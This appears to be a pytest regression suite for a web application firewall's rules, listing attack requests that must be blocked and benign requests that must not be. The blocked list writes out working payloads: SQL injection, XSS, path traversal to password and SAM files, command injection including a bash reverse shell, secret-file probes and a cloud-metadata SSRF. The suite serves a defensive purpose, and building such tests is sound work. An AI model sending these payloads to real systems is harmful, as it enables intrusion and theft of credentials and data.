"""Layer 1 regression suite.

Both directions matter equally. A WAF that blocks every attack and also blocks
`?q=100%` is not deployable, so the false-positive corpus is treated as a hard
requirement, not a nice-to-have.
"""
import pytest

from common import rules
from common import normalize as nz


def sev(path, body=""):
    return rules.worst_severity(rules.evaluate(nz.canonical(path), nz.canonical(body)))


# ── attacks that MUST be blocked outright ────────────────────────────────────
MUST_BLOCK = [
    ("sqli-union", "/api/search?q=' UNION SELECT password FROM users --", ""),
    ("sqli-union-comment", "/api/users?id=1 UNION/**/SELECT a FROM b", ""),
    ("sqli-tautology", "/api/users?id=1' OR '1'='1' --", ""),
    ("sqli-tautology-enc", "/api/users?id=1%27%20OR%20%271%27%3D%271%27%20--", ""),
    ("sqli-stacked-ddl", "/api/x?q=1'; DROP TABLE users; --", ""),
    ("sqli-stacked-dml", "/api/x?q=1'; UPDATE users SET pw='x'", ""),
    ("sqli-timing", "/api/x?id=1 AND SLEEP(5)", ""),
    ("sqli-schema", "/api/x?id=1 AND information_schema.tables", ""),
    ("sqli-xp", "/api/x?q=exec xp_cmdshell('whoami')", ""),
    ("xss-script", "/api/c", '{"t":"<script>alert(1)</script>"}'),
    ("xss-script-doubleenc", "/api/c?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E", ""),
    ("xss-onerror", "/api/c", '{"t":"<img src=x onerror=alert(1)>"}'),
    ("xss-svg", "/api/c", '{"t":"<svg onload=alert(1)>"}'),
    ("xss-cookie", "/api/c", '{"t":"document.cookie"}'),
    ("trav-basic", "/api/../../../etc/passwd", ""),
    ("trav-encoded", "/api/f/%2e%2e%2f%2e%2e%2fetc%2fpasswd", ""),
    ("trav-double-encoded", "/api/f/%252e%252e%252f%252e%252e%252fetc%252fpasswd", ""),
    ("trav-semicolon", "/api/f/..;/..;/admin", ""),
    ("trav-quad-dot", "/....//....//etc/shadow", ""),
    ("trav-backslash", "/api/f/..\\..\\windows\\system32\\config\\sam", ""),
    ("trav-proc", "/api/f/proc/self/environ", ""),
    ("cmdi-semicolon", "/api/ping?host=; cat /etc/passwd", ""),
    ("cmdi-pipe", "/api/ping?host=127.0.0.1 | whoami", ""),
    ("cmdi-subshell", "/api/x", '{"c":"$(whoami)"}'),
    ("cmdi-backtick", "/api/x", '{"c":"`id`"}'),
    ("cmdi-revshell", "/api/x", '{"c":"bash -i >& /dev/tcp/10.0.0.1/4444"}'),
    ("scan-env", "/.env", ""),
    ("scan-git", "/.git/config", ""),
    ("scan-ssh", "/.ssh/id_rsa", ""),
    ("ssrf-metadata", "/api/fetch?url=http://169.254.169.254/latest/meta-data/", ""),
    ("xss-js-uri", "/api/redirect?to=javascript:alert(document.cookie)", ""),
    ("xss-vbscript-uri", "/api/c", '{"t":"vbscript:eval(1)"}'),
    ("deser-java", "/api/import", '{"payload":"rO0ABXNyABFqYXZhLnV0aWwu"}'),
    ("deser-python", "/api/import", '{"payload":"pickle.loads(data)"}'),
]

# ── legitimate traffic that MUST NOT be blocked ──────────────────────────────
MUST_ALLOW = [
    ("search-admin", "/api/search?q=admin", ""),
    ("search-percent", "/api/search?q=100%", ""),
    ("search-select-word", "/api/search?q=select+a+product", ""),
    ("search-union-word", "/api/search?q=european+union", ""),
    ("category-space", "/api/products?category=home%20appliances", ""),
    ("irish-surname", "/api/users", '{"name":"Sean O\'Brien","email":"s@x.com"}'),
    ("hyphen-text", "/api/notes", '{"body":"use the -- flag to disable"}'),
    ("long-comment", "/api/comments", '{"text":"' + "a b " * 400 + '"}'),
    ("unicode", "/api/i18n", '{"text":"caf\\u00e9 na\\u00efve"}'),
    ("numeric-id", "/api/users/1837", ""),
    ("uuid", "/api/orders/9f8b7c6d-1234-4abc-8def-0123456789ab", ""),
    ("sort-desc", "/api/products?sort=price-desc&limit=50", ""),
    ("health", "/health", ""),
    ("dotted-file", "/api/files/report.2024.pdf", ""),
    ("version-path", "/api/v2/products", ""),
    ("email-query", "/api/users?email=a.b%40example.com", ""),
    ("price-range", "/api/products?min=10&max=100", ""),
    ("json-nested", "/api/orders", '{"items":[{"id":1,"qty":2}],"note":"gift"}'),
]


@pytest.mark.parametrize("name,path,body", MUST_BLOCK, ids=[c[0] for c in MUST_BLOCK])
def test_attacks_are_blocked(name, path, body):
    assert sev(path, body) == rules.BLOCK, f"{name} was not blocked"


@pytest.mark.parametrize("name,path,body", MUST_ALLOW, ids=[c[0] for c in MUST_ALLOW])
def test_legitimate_traffic_not_blocked(name, path, body):
    assert sev(path, body) != rules.BLOCK, f"{name} is a FALSE POSITIVE"


def test_rule_ids_unique():
    ids = [r.id for r in rules.RULES]
    assert len(ids) == len(set(ids))


def test_every_rule_has_an_explanation():
    for r in rules.RULES:
        assert r.why and len(r.why) > 10, f"{r.id} needs a usable explanation"


def test_severity_values_are_valid():
    for r in rules.RULES:
        assert r.severity in (rules.BLOCK, rules.FLAG)
